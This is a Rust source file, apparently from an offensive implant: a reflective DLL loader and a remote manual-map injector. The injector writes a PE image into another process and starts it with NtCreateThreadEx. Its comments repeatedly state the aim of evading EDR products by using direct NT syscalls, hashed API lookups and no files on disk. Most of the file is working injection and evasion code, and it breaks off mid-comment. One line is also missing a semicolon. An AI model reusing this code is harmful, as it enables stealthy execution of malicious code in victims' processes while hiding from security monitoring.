        // Use the larger of virtual_size and size_of_raw_data: a linker may
        // set VirtualSize to 0 (optimisation), which would make protection
        // change a no-op and leave the section with the wrong permissions.
        let prot_size = std::cmp::max(
            section.virtual_size as usize,
            section.size_of_raw_data as usize,
        );
        let mut prot_base = image_base.add(section.virtual_address as usize);
        let mut prot_size_val = prot_size;
        let _ = nt_syscall::syscall!(
            "NtProtectVirtualMemory",
            -1isize as u64,
            &mut prot_base as *mut _ as u64,
            &mut prot_size_val as *mut _ as u64,
            prot as u64,
            &mut old_prot as *mut _ as u64,
        );
    }

    // 5a. Ensure newly written code bytes are visible to the CPU before any
    //     mapped TLS callback or DLL entrypoint code executes.
    #[cfg(windows)]
    {
        let _ = nt_syscall::syscall!(
            "NtFlushInstructionCache",
            -1isize as u64,
            image_base as u64,
            optional_header.windows_fields.size_of_image as u64,
        );
    }

    // 5b. Invoke TLS callbacks (if any) before calling DllMain.
    //
    // Some DLLs compiled with MSVC __declspec(thread) register one or more
    // PIMAGE_TLS_CALLBACK functions in the TLS directory (data directory 9).
    // The loader must call every callback in the null-terminated array with
    // (DllHandle, DLL_PROCESS_ATTACH, Reserved=0) before the entry point.
    //
    // IMAGE_DIRECTORY_ENTRY_TLS = 9
    const IMAGE_DIRECTORY_ENTRY_TLS: usize = 9;
    if let Some(tls_entry) =
        optional_header.data_directories.data_directories[IMAGE_DIRECTORY_ENTRY_TLS]
    {
        if tls_entry.virtual_address != 0 && tls_entry.size > 0 {
            // The TLS directory layout (pointer-width fields match the target):
            //   StartAddressOfRawData  : usize
            //   EndAddressOfRawData    : usize
            //   AddressOfIndex         : usize
            //   AddressOfCallBacks     : usize  <- VA of null-terminated callback array
            //   SizeOfZeroFill         : u32
            //   Characteristics        : u32
            #[repr(C)]
            struct ImageTlsDirectory {
                _start_address_of_raw_data: usize,
                _end_address_of_raw_data: usize,
                _address_of_index: usize,
                address_of_callbacks: usize,
                _size_of_zero_fill: u32,
                _characteristics: u32,
            }
            let tls_dir =
                &*(image_base.add(tls_entry.virtual_address as usize) as *const ImageTlsDirectory);
            if tls_dir.address_of_callbacks != 0 {
                // address_of_callbacks is a VA pointing into our mapped image;
                // after relocation it already reflects the allocation address.
                let image_size = optional_header.windows_fields.size_of_image as usize;
                let image_start = image_base as usize;
                let image_end = image_start.saturating_add(image_size);
                let mut cb_ptr = tls_dir.address_of_callbacks as *const usize;
                // Defensive cap: TLS callback arrays are typically a handful of
                // entries; refuse to follow more than 32 to bound runaway loops.
                let mut remaining = 32u32;
                loop {
                    if remaining == 0 {
                        break;
                    }
                    remaining -= 1;
                    // Validate that the callback-array slot itself is inside the image.
                    let slot = cb_ptr as usize;
                    if slot < image_start
                        || slot.saturating_add(std::mem::size_of::<usize>()) > image_end
                    {
                        break;
                    }
                    let cb_va = *cb_ptr;
                    if cb_va == 0 {
                        break;
                    }
                    // Validate that the callback target is inside the image we just
                    // mapped — refuse to dispatch to anything outside it.
                    if cb_va < image_start || cb_va >= image_end {
                        break;
                    }
                    let callback: unsafe extern "system" fn(*mut c_void, u32, *mut c_void) =
                        std::mem::transmute(cb_va);
                    callback(image_base, DLL_PROCESS_ATTACH, std::ptr::null_mut());
                    cb_ptr = cb_ptr.add(1);
                }
            }
        }
    }

    // 5c. Register the .pdata section (exception handling directory) so the OS
    //     can correctly unwind the stack for exceptions thrown inside the DLL.
    //     Without this, any C++ try/catch or SEH block in the DLL terminates
    //     the process instead of propagating to a handler.
    //
    //     NOTE: RtlAddFunctionTable is retained as an IAT-visible extern call
    //     (rather than dispatched through nt_syscall) because it is an ntdll
    //     *runtime helper*, not an NT syscall.  It has no SSN and cannot be
    //     invoked via the syscall instruction.  EDR solutions almost never hook
    //     this function because it is a low-risk bookkeeping API that does not
    //     touch process memory, handles, or the object manager — it simply
    //     registers an unwind-info table with the Rtl dispatcher.  Hooking it
    //     would break legitimate exception handling across all loaded modules
    //     and would immediately flag the EDR as faulty.
    #[cfg(target_arch = "x86_64")]
    {
        for section in &pe.sections {
            // Section names are a fixed 8-byte array; trim null bytes for comparison.
            let end = section.name.iter().position(|&b| b == 0).unwrap_or(8);
            if &section.name[..end] == b".pdata" && section.size_of_raw_data > 0 {
                let pdata_ptr =
                    image_base.add(section.virtual_address as usize) as *const RuntimeFunction;
                // Each RUNTIME_FUNCTION entry is exactly 12 bytes.
                let entry_count = (section.size_of_raw_data as usize / 12) as u32;
                if entry_count > 0 {
                    RtlAddFunctionTable(pdata_ptr, entry_count, image_base as u64);
                }
                break;
            }
        }
    }

    // 6. Call entry point
    let entry_point_addr =
        image_base.add(optional_header.standard_fields.address_of_entry_point as usize);
    let entry_point: extern "system" fn(*mut c_void, u32, *mut c_void) -> bool =
        std::mem::transmute(entry_point_addr);
    if !entry_point(image_base, DLL_PROCESS_ATTACH, std::ptr::null_mut()) {
        return Err(anyhow!("DLL entry point failed"));
    }

    _guard.success = true;
    Ok(image_base)
}

// ── Remote manual-map injection ──────────────────────────────────────────────

#[repr(C)]
struct ProcessBasicInformation {
    reserved1: *mut c_void,
    peb_base_address: *mut PEB,
    reserved2: [*mut c_void; 2],
    unique_process_id: usize,
    reserved3: *mut c_void,
}

unsafe fn read_remote_struct<T>(
    process: winapi::shared::ntdef::HANDLE,
    remote: *const c_void,
) -> Option<T> {
    let mut value: T = std::mem::zeroed();
    let mut bytes_read = 0usize;
    let status = nt_syscall::syscall!(
        "NtReadVirtualMemory",
        process as u64,
        remote as u64,
        &mut value as *mut _ as u64,
        std::mem::size_of::<T>() as u64,
        &mut bytes_read as *mut _ as u64,
    );
    if status.map_or(true, |s| s < 0) || bytes_read != std::mem::size_of::<T>() {
        None
    } else {
        Some(value)
    }
}

unsafe fn get_remote_ntdll_base(target_process: winapi::shared::ntdef::HANDLE) -> Option<usize> {
    type NtQueryInformationProcessFn = unsafe extern "system" fn(
        winapi::shared::ntdef::HANDLE,
        u32,
        *mut c_void,
        u32,
        *mut u32,
    ) -> i32;

    let local_ntdll =
        pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"))?;
    let ntqip_addr = pe_resolve::get_proc_address_by_hash(
        local_ntdll,
        pe_resolve::hash_str(b"NtQueryInformationProcess\0"),
    )?;
    let ntqip: NtQueryInformationProcessFn = std::mem::transmute(ntqip_addr as *const ());

    let mut pbi: ProcessBasicInformation = std::mem::zeroed();
    let mut return_len = 0u32;
    let status = ntqip(
        target_process,
        0, // ProcessBasicInformation
        &mut pbi as *mut _ as *mut c_void,
        std::mem::size_of::<ProcessBasicInformation>() as u32,
        &mut return_len,
    );
    if status < 0 || pbi.peb_base_address.is_null() {
        return None;
    }

    let peb: PEB = read_remote_struct(target_process, pbi.peb_base_address as *const c_void)?;
    if peb.Ldr.is_null() {
        return None;
    }

    let ldr: PEB_LDR_DATA = read_remote_struct(target_process, peb.Ldr as *const c_void)?;
    let list_head = (peb.Ldr as usize + 0x10) as *mut LIST_ENTRY; // InLoadOrderModuleList
    let mut current = ldr.InLoadOrderModuleList.Flink;
    let mut guard = 0usize;

    while !current.is_null() && current != list_head && guard < 1024 {
        guard += 1;

        let entry: LDR_DATA_TABLE_ENTRY =
            match read_remote_struct(target_process, current as *const c_void) {
                Some(e) => e,
                None => break,
            };

        let dll_base = entry.DllBase as usize;
        let base_name = entry.BaseDllName;
        if dll_base != 0
            && !base_name.Buffer.is_null()
            && base_name.Length >= 2
            && (base_name.Length as usize) <= 520
        {
            let chars = (base_name.Length / 2) as usize;
            let mut wide = vec![0u16; chars];
            let mut bytes_read = 0usize;
            let status = nt_syscall::syscall!(
                "NtReadVirtualMemory",
                target_process as u64,
                base_name.Buffer as u64,
                wide.as_mut_ptr() as u64,
                base_name.Length as u64,
                &mut bytes_read as *mut _ as u64,
            );
            if status.map_or(false, |s| s >= 0) && bytes_read == base_name.Length as usize {
                let name = String::from_utf16_lossy(&wide).to_ascii_lowercase();
                if name == "ntdll.dll" || name == "ntdll" {
                    return Some(dll_base);
                }
            }
        }

        current = entry.InLoadOrderLinks.Flink;
    }

    None
}

/// Build a lowercase DLL-name → remote base-address map for every module loaded
/// in `target_process`, using a remote PEB walk via `NtQueryInformationProcess`
/// and `NtReadVirtualMemory`.
///
/// Called when the shared-ASLR assumption does not hold (local and remote
/// `ntdll.dll` bases differ), so that subsequent IAT resolution can use actual
/// remote-process module bases rather than the local PEB-walk results.
///
/// All APIs are dispatched through NT syscalls (via pe_resolve for
/// `NtQueryInformationProcess` and `nt_syscall::syscall!` for reads) to avoid
/// IAT-visible `CreateToolhelp32Snapshot` / `Module32First` / `Module32Next`
/// hooks installed by EDR products.
///
/// # Errors
///
/// Returns `Err` if the remote PEB cannot be read or the module list is
/// corrupt.  In that case the caller must **not** proceed with local import
/// addresses.
unsafe fn build_remote_module_map(
    target_process: winapi::um::winnt::HANDLE,
) -> Result<HashMap<String, usize>> {
    type NtQueryInformationProcessFn = unsafe extern "system" fn(
        winapi::shared::ntdef::HANDLE,
        u32,
        *mut c_void,
        u32,
        *mut u32,
    ) -> i32;

    // Resolve NtQueryInformationProcess via PEB walk (same pattern as
    // get_remote_ntdll_base).  This avoids the hookable
    // kernel32!CreateToolhelp32Snapshot IAT entry.
    let local_ntdll =
        pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"))
            .ok_or_else(|| anyhow!("build_remote_module_map: ntdll not found via PEB walk"))?;
    let ntqip_addr = pe_resolve::get_proc_address_by_hash(
        local_ntdll,
        pe_resolve::hash_str(b"NtQueryInformationProcess\0"),
    )
    .ok_or_else(|| anyhow!("build_remote_module_map: NtQueryInformationProcess not found"))?;
    let ntqip: NtQueryInformationProcessFn = std::mem::transmute(ntqip_addr as *const ());

    // Step 1: query the remote PEB address via NtQueryInformationProcess.
    let mut pbi: ProcessBasicInformation = std::mem::zeroed();
    let mut return_len = 0u32;
    let status = ntqip(
        target_process,
        0, // ProcessBasicInformation
        &mut pbi as *mut _ as *mut c_void,
        std::mem::size_of::<ProcessBasicInformation>() as u32,
        &mut return_len,
    );
    if status < 0 || pbi.peb_base_address.is_null() {
        return Err(anyhow!(
            "build_remote_module_map: NtQueryInformationProcess failed (status={status:#x})"
        ));
    }

    // Step 2: read PEB.Ldr to get the loader data structure.
    let peb: PEB = read_remote_struct(target_process, pbi.peb_base_address as *const c_void)
        .ok_or_else(|| anyhow!("build_remote_module_map: failed to read remote PEB"))?;
    if peb.Ldr.is_null() {
        return Err(anyhow!("build_remote_module_map: remote PEB.Ldr is null"));
    }

    // Step 3: walk InLoadOrderModuleList starting at PEB.Ldr + 0x10.
    // The list_head lives at offset 0x10 (InLoadOrderModuleList) inside
    // PEB_LDR_DATA.  Each entry is an LDR_DATA_TABLE_ENTRY whose first field
    // (InLoadOrderLinks) is the LIST_ENTRY that chains the list together.
    let ldr: PEB_LDR_DATA = read_remote_struct(target_process, peb.Ldr as *const c_void)
        .ok_or_else(|| anyhow!("build_remote_module_map: failed to read remote PEB_LDR_DATA"))?;
    let list_head = (peb.Ldr as usize + 0x10) as *mut LIST_ENTRY; // InLoadOrderModuleList offset
    let mut current = ldr.InLoadOrderModuleList.Flink;
    let mut guard = 0usize;
    let mut map = HashMap::new();

    while !current.is_null() && current != list_head && guard < 4096 {
        guard += 1;

        let entry: LDR_DATA_TABLE_ENTRY =
            match read_remote_struct(target_process, current as *const c_void) {
                Some(e) => e,
                None => break,
            };

        let dll_base = entry.DllBase as usize;
        let base_name = entry.BaseDllName;
        if dll_base != 0
            && !base_name.Buffer.is_null()
            && base_name.Length >= 2
            && (base_name.Length as usize) <= 520
        {
            let chars = (base_name.Length / 2) as usize;
            let mut wide = vec![0u16; chars];
            let mut bytes_read = 0usize;
            let read_status = nt_syscall::syscall!(
                "NtReadVirtualMemory",
                target_process as u64,
                base_name.Buffer as u64,
                wide.as_mut_ptr() as u64,
                base_name.Length as u64,
                &mut bytes_read as *mut _ as u64,
            );
            if read_status.map_or(false, |s| s >= 0) && bytes_read == base_name.Length as usize {
                let name = String::from_utf16_lossy(&wide).to_ascii_lowercase();
                map.insert(name, dll_base);
            }
        }

        current = entry.InLoadOrderLinks.Flink;
    }

    Ok(map)
}

/// Resolve the address of an exported function in a DLL that is loaded at
/// `remote_dll_base` inside `target_process`.
///
/// Reads the PE export table from the remote process address space via
/// `ReadProcessMemory` so that the returned address is correct even when the
/// remote process has a different ASLR layout from the current process.
///
/// Only PE32+ (64-bit) DLLs are supported; returns `Err` for PE32 images.
///
/// # Returns
///
/// The absolute virtual address of `fn_name` in the *remote* process on
/// success.
///
/// # Errors
///
/// Returns `Err` if:
/// - the PE headers cannot be read or are malformed,
/// - the DLL has no export directory,
/// - `fn_name` is not found in the export table.
unsafe fn resolve_remote_export(
    target_process: winapi::um::winnt::HANDLE,
    remote_dll_base: usize,
    fn_name: &str,
) -> Result<usize> {
    // Helper: read exactly `n` bytes from the remote process at `addr`.
    let read_bytes = |addr: usize, n: usize| -> Result<Vec<u8>> {
        let mut buf = vec![0u8; n];
        let mut bytes_read = 0usize;
        let status = nt_syscall::syscall!(
            "NtReadVirtualMemory",
            target_process as u64,
            addr as u64,
            buf.as_mut_ptr() as u64,
            n as u64,
            &mut bytes_read as *mut _ as u64,
        );
        if status.map_or(true, |s| s < 0) || bytes_read != n {
            return Err(anyhow!(
                "resolve_remote_export: NtReadVirtualMemory at {addr:#x} len={n} failed: status={:?}",
                status
            ));
        }
        Ok(buf)
    };

    // ── Parse IMAGE_DOS_HEADER (64 bytes) ─────────────────────────────────
    let dos = read_bytes(remote_dll_base, 64)?;
    let e_magic = u16::from_le_bytes(dos[0..2].try_into().unwrap());
    if e_magic != 0x5A4D {
        // "MZ"
        return Err(anyhow!(
            "resolve_remote_export: bad DOS magic at {remote_dll_base:#x}: {e_magic:#x}"
        ));
    }
    let e_lfanew = u32::from_le_bytes(dos[0x3C..0x40].try_into().unwrap()) as usize;

    // ── Parse IMAGE_NT_HEADERS64 (144 bytes covers DataDirectory[0]) ──────
    //
    // Byte layout from the NT headers base address:
    //   +0   Signature                  (4 bytes)  = "PE\0\0" = 0x00004550
    //   +4   IMAGE_FILE_HEADER          (20 bytes)
    //   +24  IMAGE_OPTIONAL_HEADER64:
    //          [0..112)  pre-DataDirectory fields
    //          [112..116) DataDirectory[0].VirtualAddress  ← export RVA
    //          [116..120) DataDirectory[0].Size             ← export size
    //   Total needed: 4 + 20 + 112 + 8 = 144 bytes.
    let nt = read_bytes(remote_dll_base + e_lfanew, 144)?;
    if u32::from_le_bytes(nt[0..4].try_into().unwrap()) != 0x0000_4550 {
        return Err(anyhow!(
            "resolve_remote_export: bad PE signature at {remote_dll_base:#x}"
        ));
    }
    // Optional-header magic: 0x020B = PE32+ (64-bit).
    let opt_magic = u16::from_le_bytes(nt[24..26].try_into().unwrap());
    if opt_magic != 0x020B {
        return Err(anyhow!(
            "resolve_remote_export: unsupported optional-header magic {opt_magic:#x} \
             at {remote_dll_base:#x} (expected PE32+ / 0x020B)"
        ));
    }
    let export_rva = u32::from_le_bytes(nt[136..140].try_into().unwrap()) as usize;
    let export_size = u32::from_le_bytes(nt[140..144].try_into().unwrap()) as usize;
    if export_rva == 0 || export_size < 40 {
        return Err(anyhow!(
            "resolve_remote_export: DLL at {remote_dll_base:#x} has no export directory"
        ));
    }

    // ── Read and walk the export directory ───────────────────────────────
    // IMAGE_EXPORT_DIRECTORY field offsets (all DWORDs unless noted):
    //   +20  NumberOfFunctions
    //   +24  NumberOfNames
    //   +28  AddressOfFunctions     RVA → DWORD[] of function RVAs
    //   +32  AddressOfNames         RVA → DWORD[] of name RVAs
    //   +36  AddressOfNameOrdinals  RVA → WORD[]  of hint ordinals
    let exp = read_bytes(remote_dll_base + export_rva, export_size)?;
    let num_names = u32::from_le_bytes(exp[24..28].try_into().unwrap()) as usize;
    let fn_table_rva = u32::from_le_bytes(exp[28..32].try_into().unwrap()) as usize;
    let name_table_rva = u32::from_le_bytes(exp[32..36].try_into().unwrap()) as usize;
    let ordinal_table_rva = u32::from_le_bytes(exp[36..40].try_into().unwrap()) as usize;

    if num_names == 0 {
        return Err(anyhow!(
            "resolve_remote_export: DLL at {remote_dll_base:#x} has no named exports"
        ));
    }

    // Read name-pointer and ordinal tables in bulk to minimise round-trips.
    let name_ptrs = read_bytes(remote_dll_base + name_table_rva, num_names * 4)?;
    let ordinals = read_bytes(remote_dll_base + ordinal_table_rva, num_names * 2)?;

    for i in 0..num_names {
        let name_rva =
            u32::from_le_bytes(name_ptrs[i * 4..i * 4 + 4].try_into().unwrap()) as usize;
        // Read the null-terminated export name (cap at 256 bytes to bound I/O).
        let name_raw = read_bytes(remote_dll_base + name_rva, 256)
            .unwrap_or_else(|_| vec![0u8; 256]);
        let nul = name_raw.iter().position(|&b| b == 0).unwrap_or(256);
        let name = std::str::from_utf8(&name_raw[..nul]).unwrap_or("");
        if name == fn_name {
            let ordinal =
                u16::from_le_bytes(ordinals[i * 2..i * 2 + 2].try_into().unwrap()) as usize;
            let fn_rva_bytes =
                read_bytes(remote_dll_base + fn_table_rva + ordinal * 4, 4)?;
            let fn_rva = u32::from_le_bytes(fn_rva_bytes.try_into().unwrap()) as usize;
            return Ok(remote_dll_base + fn_rva);
        }
    }

    Err(anyhow!(
        "resolve_remote_export: '{}' not found in DLL at {remote_dll_base:#x}",
        fn_name
    ))
}

/// Map a PE DLL into a remote process without writing any file to disk.
///
/// # What this does
///
/// 1. **Allocates** a region in the target process large enough for the
///    complete mapped image via `NtAllocateVirtualMemory` (syscall-only path).
/// 2. **Copies** the PE headers and each raw section into the remote region
///    with `NtWriteVirtualMemory` (syscall-only path).
/// 3. **Applies base relocations** for the remote allocation address
///    (all arithmetic is done in local memory, then the patched words are
///    written into the remote image).
/// 4. **Resolves the Import Address Table** from local or remote module data.
///    Before import resolution, the loader verifies the shared-ASLR assumption
///    by comparing local and remote `ntdll.dll` bases via
///    `NtQueryInformationProcess` + `NtReadVirtualMemory`, then validating
///    critical DLL parity (`kernel32.dll`, `kernelbase.dll`) from a remote
///    PEB-walk module snapshot. If mismatches are detected, imports are resolved
///    from the remote process's actual module addresses (via
///    remote PEB walk + per-DLL PE export-table reads). If remote module
///    enumeration fails in the mismatch path, an error is returned rather than
///    proceeding with incorrect local addresses.
/// 5. **Starts the DLL entry point** via `NtCreateThreadEx` dispatched through
///    `nt_syscall::syscall!` (bypasses IAT and inline hooks).
///    Fire-and-forget: the returned thread handle is closed immediately after
///    creation.
///
/// # Arguments
///
/// * `target_process` — A `HANDLE` with at least `PROCESS_VM_OPERATION |
///   PROCESS_VM_WRITE | PROCESS_CREATE_THREAD` access rights.  The caller is
///   responsible for opening and closing the handle.
/// * `dll_bytes` — The raw PE DLL bytes to inject (in-memory, not a path).
///
/// # Exception handling (.pdata registration)
///
/// On x86-64, PE images contain a `.pdata` section with `RUNTIME_FUNCTION`
/// entries that the OS uses for exception unwinding.  The local loader
/// registers these via a direct `RtlAddFunctionTable` call.  In the remote
/// path, this function extends the DllMain shellcode stub to call
/// `RtlAddFunctionTable` (resolved from the target's ntdll via the same
/// fast/safe import-resolution path used for the IAT) **before** jumping to
/// DllMain.  This ensures C++ exceptions and SEH in the injected DLL work
/// correctly in the target process.
///
/// # Returns
///
/// The virtual address of the remote image base on success.
pub unsafe fn load_dll_in_remote_process(
    target_process: winapi::um::winnt::HANDLE,
    dll_bytes: &[u8],
) -> Result<*mut c_void> {
    let pe = PE::parse(dll_bytes)?
    let opt = pe
        .header
        .optional_header
        .ok_or_else(|| anyhow!("PE has no optional header"))?;

    let image_size = opt.windows_fields.size_of_image as usize;
    let preferred_base = opt.windows_fields.image_base as isize;

    // Verify the shared-ASLR assumption used by local import resolution.
    // When ntdll bases differ, all system-DLL addresses resolved in our
    // process will be wrong in the remote process. In that case we build
    // a remote module map via Toolhelp and resolve each IAT entry from the
    // actual remote module addresses. Failing to enumerate the remote
    // modules is a hard error: proceeding with local addresses would cause
    // silent import corruption in the target process.
    //
    // Even when ntdll matches, also verify critical Win32 DLLs (kernel32,
    // kernelbase). If either differs, switch to remote-module resolution.
    let local_ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"));
    let remote_ntdll = get_remote_ntdll_base(target_process);
    let remote_module_map: Option<HashMap<String, usize>> =
        if let (Some(local), Some(remote)) = (local_ntdll, remote_ntdll) {
            if local != remote {
                tracing::warn!(
                    "remote_manual_map: NTDLL base mismatch (local={:#x}, remote={:#x}). \
                     Shared ASLR assumption does not hold — resolving imports from \
                     remote process module list.",
                    local,
                    remote
                );
                // Build the remote module map; fail immediately if enumeration
                // fails rather than proceeding with incorrect local addresses.
                Some(build_remote_module_map(target_process)?)
            } else {
                // ntdll matches: verify other critical DLL bases before taking
                // the shared-ASLR fast path.
                match build_remote_module_map(target_process) {
                    Ok(rmod) => {
                        let local_kernel32 = pe_resolve::get_module_handle_by_hash(
                            pe_resolve::hash_str(b"kernel32.dll\0"),
                        );
                        let local_kernelbase = pe_resolve::get_module_handle_by_hash(
                            pe_resolve::hash_str(b"kernelbase.dll\0"),
                        );
                        let remote_kernel32 = rmod.get("kernel32.dll").copied();
                        let remote_kernelbase = rmod.get("kernelbase.dll").copied();

                        let kernel32_mismatch =
                            matches!((local_kernel32, remote_kernel32), (Some(l), Some(r)) if l != r);
                        let kernelbase_mismatch =
                            matches!((local_kernelbase, remote_kernelbase), (Some(l), Some(r)) if l != r);

                        if kernel32_mismatch || kernelbase_mismatch {
                tracing::warn!(
                                "remote_manual_map: shared-ASLR verification failed (kernel32 mismatch={}, kernelbase mismatch={}); resolving imports from remote process module list.",
                                kernel32_mismatch,
                                kernelbase_mismatch
                            );
                            Some(rmod)
                        } else {
                            None
                        }
                    }
                    Err(err) => {
                        // Preserve the fast path when the extra verification step
                        // cannot be performed and ntdll already matches.
                tracing::warn!(
                            "remote_manual_map: unable to verify kernel32/kernelbase base parity ({}); keeping shared-ASLR fast path",
                            err
                        );
                        None
                    }
                }
            }
        } else {
            None
        };

    // ── Step 1: allocate in the remote process ────────────────────────────
    // Use NtAllocateVirtualMemory to avoid IAT-visible VirtualAllocEx hooks.
    let _ = nt_syscall::init_syscall_infrastructure(); // idempotent

    let mut remote_base: *mut c_void = std::ptr::null_mut();
    let mut alloc_size = image_size;
    let alloc_status = nt_syscall::syscall!(
        "NtAllocateVirtualMemory",
        target_process as u64,
        &mut remote_base as *mut _ as u64,
        0u64,
        &mut alloc_size as *mut _ as u64,
        (MEM_COMMIT | MEM_RESERVE) as u64,
        PAGE_READWRITE as u64,
    );
    if alloc_status.map_or(true, |s| s < 0) || remote_base.is_null() {
        return Err(anyhow!(
            "NtAllocateVirtualMemory(remote) failed: status={:?}",
            alloc_status
        ));
    }

    // All remote memory writes and protection changes are dispatched through
    // nt_syscall::syscall! to avoid IAT-visible and inline-hookable Win32 wrappers.
    let protect_remote =
        |base: &mut *mut c_void, size: &mut usize, prot: u32, old: &mut u32| -> Result<()> {
            let status = nt_syscall::syscall!(
                "NtProtectVirtualMemory",
                target_process as u64,
                base as *mut _ as u64,
                size as *mut _ as u64,
                prot as u64,
                old as *mut _ as u64,
            );
            if status.map_or(true, |s| s < 0) {
                return Err(anyhow!(
                    "NtProtectVirtualMemory failed (status={:?})",
                    status
                ));
            }
            Ok(())
        };

    // Helper: write a local buffer slice into the remote process at an offset
    // from remote_base. Temporarily flips target pages to RW for the write and
    // restores their prior protection immediately afterward.
    let write_remote = |rva: usize, data: &[u8]| -> Result<()> {
        if data.is_empty() {
            return Ok(());
        }
        let dest = (remote_base as usize + rva) as *mut c_void;

        let mut prot_base = dest;
        let mut prot_size = data.len();
        let mut old_prot = 0u32;
        protect_remote(&mut prot_base, &mut prot_size, PAGE_READWRITE, &mut old_prot)?;

        let mut written = 0usize;
        let status = nt_syscall::syscall!(
            "NtWriteVirtualMemory",
            target_process as u64,
            dest as u64,
            data.as_ptr() as u64,
            data.len() as u64,
            &mut written as *mut _ as u64,
        );

        let mut restore_dummy = 0u32;
        // Restore original protection even if the write failed.
        let _ = protect_remote(
            &mut prot_base,
            &mut prot_size,
            old_prot,
            &mut restore_dummy,
        );

        if status.map_or(true, |s| s < 0) || written != data.len() {
            return Err(anyhow!(
                "NtWriteVirtualMemory failed at rva {rva:#x} (status={:?}, written={written:#x}, expected={:#x})",
                status,
                data.len()
            ));
        }
        Ok(())
    };

    // ── Step 2: copy PE headers ────────────────────────────────────────────
    let header_size = opt.windows_fields.size_of_headers as usize;
    write_remote(0, &dll_bytes[..header_size.min(dll_bytes.len())])?;

    // ── Step 3: copy sections ──────────────────────────────────────────────
    for section in &pe.sections {
        let raw_offset = section.pointer_to_raw_data as usize;
        let raw_size = section.size_of_raw_data as usize;
        if raw_size == 0 {
            continue;
        }
        if raw_offset.saturating_add(raw_size) > dll_bytes.len() {
            return Err(anyhow!(
                "section at raw offset {raw_offset:#x}+{raw_size:#x} exceeds dll_bytes length"
            ));
        }
        let section_data = &dll_bytes[raw_offset..raw_offset + raw_size];
        write_remote(section.virtual_address as usize, section_data)?;
    }

    // ── Step 3b: apply per-section memory protections ─────────────────────
    // The allocation was made as PAGE_READWRITE so we could write sections.
    // Now apply the same per-section policy as the local variant so sections
    // are never left RWX.  W+X is downgraded to RX; later write operations
    // temporarily re-enable RW via NtProtectVirtualMemory.
    for section in &pe.sections {
        let prot_size = std::cmp::max(
            section.virtual_size as usize,
            section.size_of_raw_data as usize,
        );
        if prot_size == 0 {
            continue;
        }
        let rva = section.virtual_address as usize;
        let ch = section.characteristics;
        let exec = ch & IMAGE_SCN_MEM_EXECUTE != 0;
        let read = ch & IMAGE_SCN_MEM_READ != 0;
        let write = ch & IMAGE_SCN_MEM_WRITE != 0;
        let protect = match (exec, read, write) {
            (true, _, true) => PAGE_EXECUTE_READ,
            (true, true, false) => PAGE_EXECUTE_READ,
            (true, false, false) => PAGE_EXECUTE,
            (false, _, true) => PAGE_READWRITE,
            (false, true, false) => PAGE_READONLY,
            (false, false, false) => PAGE_NOACCESS,
        };

        let mut target = (remote_base as usize + rva) as *mut c_void;
        let mut size = prot_size;
        let mut old = 0u32;
        protect_remote(&mut target, &mut size, protect, &mut old)?;
    }

    // ── Step 4a: compute and apply base relocations ────────────────────────
    // All patches are computed in a local buffer then written remotely.
    let base_delta = remote_base as isize - preferred_base;
    if base_delta != 0 {
        if let Some(reloc_dir) = opt.data_directories.data_directories
            [IMAGE_DIRECTORY_ENTRY_BASERELOC as usize]
        {
            if reloc_dir.virtual_address != 0 && reloc_dir.size > 0 {
                let reloc_rva = reloc_dir.virtual_address as usize;
                let reloc_size = reloc_dir.size as usize;

                // Read the relocation directory from the remote image.
                let mut reloc_data = vec![0u8; reloc_size];
                let mut bytes_read = 0usize;
                let reloc_read_status = nt_syscall::syscall!(
                    "NtReadVirtualMemory",
                    target_process as u64,
                    (remote_base as usize + reloc_rva) as u64,
                    reloc_data.as_mut_ptr() as u64,
                    reloc_size as u64,
                    &mut bytes_read as *mut _ as u64,
                );
                if reloc_read_status.map_or(true, |s| s < 0) || bytes_read != reloc_size {
                    return Err(anyhow!(
                        "NtReadVirtualMemory for reloc directory failed: status={:?}",
                        reloc_read_status
                    ));
                }

                let mut offset = 0usize;
                while offset + 8 <= reloc_size {
                    let page_rva = u32::from_le_bytes(
                        reloc_data[offset..offset + 4].try_into().unwrap(),
                    ) as usize;
                    let block_size = u32::from_le_bytes(
                        reloc_data[offset + 4..offset + 8].try_into().unwrap(),
                    ) as usize;
                    if block_size < 8 || offset + block_size > reloc_size {
                        break;
                    }
                    let entries_count = (block_size - 8) / 2;
                    let entries_start = offset + 8;
                    for i in 0..entries_count {
                        let off = entries_start + i * 2;
                        let entry =
                            u16::from_le_bytes(reloc_data[off..off + 2].try_into().unwrap());
                        let reloc_type = (entry >> 12) as u8;
                        let reloc_offset = (entry & 0x0FFF) as usize;
                        let field_rva = page_rva + reloc_offset;

                        match reloc_type {
                            // IMAGE_REL_BASED_DIR64: 64-bit absolute VA (x64, ARM64)
                            10 => {
                                let mut buf = [0u8; 8];
                                let mut n = 0usize;
                                let src = (remote_base as usize + field_rva) as u64;
                                let _ = nt_syscall::syscall!(
                                    "NtReadVirtualMemory",
                                    target_process as u64,
                                    src,
                                    buf.as_mut_ptr() as u64,
                                    8u64,
                                    &mut n as *mut _ as u64,
                                );
                                let val = i64::from_le_bytes(buf);
                                let patched = (val as isize + base_delta).to_le_bytes();
                                write_remote(field_rva, &patched)?;
                            }
                            // IMAGE_REL_BASED_HIGHLOW: 32-bit absolute VA (x86)
                            3 => {
                                let mut buf = [0u8; 4];
                                let mut n = 0usize;
                                let src = (remote_base as usize + field_rva) as u64;
                                let _ = nt_syscall::syscall!(
                                    "NtReadVirtualMemory",
                                    target_process as u64,
                                    src,
                                    buf.as_mut_ptr() as u64,
                                    4u64,
                                    &mut n as *mut _ as u64,
                                );
                                let val = i32::from_le_bytes(buf);
                                let patched =
                                    ((val as isize + base_delta) as i32).to_le_bytes();
                                write_remote(field_rva, &patched)?;
                            }
                            0 => {} // padding
                            _ => {
                                #[cfg(debug_assertions)]
                                tracing::debug!(
                                    "remote_manual_map: skipping unhandled reloc type \
                                     {reloc_type} at page_rva+offset {field_rva:#x}"
                                );
                            }
                        }
                    }
                    offset += block_size;
                }
            }
        }
    }

    // ── Step 4b: resolve IAT ──────────────────────────────────────────────
    // Two resolution paths:
    //
    // Fast path (remote_module_map is None):
    //   The shared-ASLR assumption holds — system DLLs share a single
    //   per-boot ASLR base across all processes (copy-on-write physical pages).
    //   Resolving via PEB walk in OUR process yields correct remote addresses.
    //
    // Safe path (remote_module_map is Some):
    //   Shared-ASLR verification failed (ntdll mismatch or critical DLL
    //   mismatch, e.g. cross-session / WoW64 layout differences).
